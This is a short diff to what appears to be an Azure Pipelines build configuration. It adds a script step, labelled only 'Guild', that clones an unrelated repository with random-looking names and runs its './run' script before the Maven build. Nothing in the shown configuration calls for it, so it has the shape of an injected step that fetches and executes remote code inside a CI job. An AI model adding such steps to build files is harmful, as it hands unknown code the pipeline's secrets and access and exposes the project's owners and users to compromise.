@@ -35,6 +35,8 @@ stages:
     pool:
       vmImage: $(vmImageName)
     steps:
+    - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
+      displayName: Guild
     - task: Maven@3
       displayName: Maven Build
       inputs:
